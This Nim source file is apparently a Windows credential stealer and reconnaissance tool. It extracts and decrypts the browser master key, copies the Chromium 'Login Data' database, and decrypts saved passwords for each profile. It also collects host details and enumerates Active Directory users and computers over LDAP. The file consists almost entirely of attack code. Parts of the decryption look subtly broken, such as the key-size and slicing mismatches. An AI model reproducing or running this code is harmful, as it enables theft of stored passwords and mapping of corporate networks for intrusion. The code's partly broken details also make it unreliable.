import std/[os, json, base64, strutils, net, tables, nativesockets, strformat, re, enumerate]
import db_connector/db_sqlite
import system
import winim/[lean, com]
import nimcrypto

# Change to your chromium based browser

let 
  CHROME_PATH_LOCAL_STATE = joinPath(getEnv("USERPROFILE"), r"AppData\Local\Thorium\User Data\Local State")
  CHROME_PATH = joinPath(getEnv("USERPROFILE"), r"AppData\Local\Thorium\User Data")
  OUTPUT_FILE_PATH = r"C:\temp\output.txt"

func toString*(bytes: openArray[byte]): string {.inline.} =
  ## Converts a byte sequence to the corresponding string.
  let length = bytes.len
  if length > 0:
    result = newString(length)
    copyMem(result.cstring, bytes[0].unsafeAddr, length)

proc get_secret_key(): string =
  try:
    let local_state = readFile(CHROME_PATH_LOCAL_STATE)
    let local_state_json = parseJson(local_state)

    var secret_key = decode(local_state_json["os_crypt"]["encrypted_key"].getStr())
    secret_key = secret_key[5..^1]

    var data = DATA_BLOB(pbData: cast[ptr BYTE](secret_key.cstring), cbData: cast[DWORD](secret_key.len))
    var output = DATA_BLOB()

    discard CryptUnprotectData(addr data, nil, nil, nil, nil, 0, addr output)
    
    return $output.pbData
  except Exception as e:
    echo e.msg
    echo "[ERR] Chrome secretkey cannot be found"
    return ""

proc decryptPassword(ciphertext: string, secretkey: string): string =
  try:
    # (3-a) Initialisation vector for AES decryption
    let initialisation_vector = ciphertext[3..14]
    # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
    # Encrypted password is 192 bits
    let encrypted_password = ciphertext[15..ciphertext.high-16]


    echo "\n ------------"
    echo initialisation_vector.toHex
    echo encrypted_password.toHex
    echo "------------\n"
    # var bInitialisation_vector = cast[seq[byte]](initialisation_vector)
    # var bEncrypted_password = cast[seq[byte]](encrypted_password)

    # AES Initialization
    var dctx: GCM[aes192]
    var key: array[aes192.sizeKey, byte]
    var iv: array[aes192.sizeBlock, byte]
    var encText = newSeq[byte](len(encrypted_password))
    var decText = newSeq[byte](len(encrypted_password))
    var emptyByteArray: array[0, byte]

    copyMem(addr key[0], addr secretkey[0], len(secretkey))
    copyMem(addr iv[0], addr initialisation_vector[0], len(initialisation_vector))
    copyMem(addr encText[0], addr encrypted_password[0], len(encryptedPassword))

    echo "\n ------------"
    echo key.toHex
    echo iv[0..iv.high-4]
    echo encrypted_password.toHex
    echo "------------\n"

    dctx.init(key,iv[0..iv.high-4], emptyByteArray)
    dctx.decrypt(encText, decText)
    dctx.clear()
    return main.toString(decText)
  except CatchableError as e:
    echo "An error occurred: ", e.msg
  finally:
    echo "Decryption process finished."

proc getDbConnection(chrome_path_login_db: string): DbConn =
  try:
    copyFile(chrome_path_login_db, r"C:\temp\Loginvault.db")
    return open(r"C:\temp\Loginvault.db", "", "", "")
  except Exception as e:
    echo e.msg
    echo "[ERR] Chrome database cannot be found"
    return nil

proc retrieveSystemInfo(): Table[string, seq[string]] =
  var system_info = initTable[string, seq[string]]()
  system_info["Computer Name"] = @[getEnv("COMPUTERNAME")]
  system_info["Domain"] = @[getEnv("USERDOMAIN")]
  system_info["OS Version"] = @[system.hostOS]
  system_info["Architecture"] = @[system.hostCPU]
  system_info["Processor"] = @[system.hostCPU]
  system_info["System Type"] = @[system.hostOS]
  system_info["Hostname"] = @[getHostname()]
  system_info["IP Address"] = getHostByName(getHostname()).addrList 
  return system_info

proc retrieveDomainUsers(): seq[string] =
  var domainUsers: seq[string] = @[]
  try:
    let objConnection = CreateObject("ADODB.Connection")
    let objCommand = CreateObject("ADODB.Command")
    objConnection.Provider = "ADsDSOObject"
    objConnection.Open("Active Directory Provider")
    objCommand.ActiveConnection = objConnection

    let userDnsDomain = getEnv("USERDNSDOMAIN").split('.')
    objCommand.CommandText = "SELECT Name FROM 'LDAP://DC=" & userDnsDomain[0] & ",DC=" & userDnsDomain[1] & "' WHERE objectClass='user'"

    let objRecordSet = objCommand.Execute()

    while not bool(objRecordSet.Fields("EOF").Value):
      domainUsers.add(objRecordSet.Fields("Name").Value)
      objRecordSet.MoveNext()

  except Exception as e:
    echo "Error retrieving domain users: ", e.msg

  return domainUsers

proc retrieveDomainComputers(): seq[string] =
  var domainComputers: seq[string] = @[]
  try:
    let objConnection = CreateObject("ADODB.Connection")
    let objCommand = CreateObject("ADODB.Command")
    objConnection.Provider = "ADsDSOObject"
    objConnection.Open("Active Directory Provider")
    objCommand.ActiveConnection = objConnection

    let userDnsDomain = getEnv("USERDNSDOMAIN").split('.')
    objCommand.CommandText = fmt"SELECT Name FROM 'LDAP://OU=Computers,DC={userDnsDomain[0]},DC={userDnsDomain[1]}' WHERE objectClass='computer'"

    let objRecordSet = objCommand.Execute()

    while not bool(objRecordSet.Fields("EOF").Value):
      domainComputers.add(objRecordSet.Fields("Name").Value)
      objRecordSet.MoveNext()

  except Exception as e:
    echo "Error retrieving domain computers: ", e.msg

  return domainComputers

when isMainModule:
  try:
    # Redirect console output to a text file
    #let outputFile = open(OUTPUT_FILE_PATH, fmWrite)
    # stdout = outputFile

    # Retrieve system information
    let systemInfo = retrieveSystemInfo()
    echo("\n=== System Information ===")
    for key, value in systemInfo:
      echo(fmt"{key}: {value}")

    # Retrieve domain users
    let domainUsers = retrieveDomainUsers()
    echo("\n=== Domain Users ===")
    for user in domainUsers:
      echo(fmt"Username: {user}")

    # Retrieve domain computers
    let domainComputers = retrieveDomainComputers()
    echo("\n=== Domain Computers ===")
    for computer in domainComputers:
      echo(fmt"Computer: {computer}")

    # Get secret key
    let secretKey = getSecretKey().toHex[0..63].parseHexStr
    echo secretKey
    # Search user profile or default folder (this is where the encrypted login password is stored)
    var folders: seq[string] = @[]

    for element in walkDir(CHROME_PATH):
      if contains(element.path, re"Profile \d+$|Default$"):
          folders.add(element.path)

    for folder in folders:
      let chromePathLoginDb = joinPath(folder, "Login Data")
      let conn = get_db_connection(chromePathLoginDb)
      if secretKey != "" and conn.tryExec(sql"SELECT action_url, username_value, password_value FROM logins"):
        for login in conn.fastRows(sql"SELECT action_url, username_value, password_value FROM logins"):
            var url = login[0]
            var username = login[1]
            var encText = login[2]
            if url != "" and username != "" and encText != "":
              var decrypted_password = decryptPassword(encText, secretKey)
              echo decrypted_password


  except Exception as e:
    echo("[ERR] ", e.msg)
  finally:
    # Close the text file
    echo("finished")
    # close(outputFile)
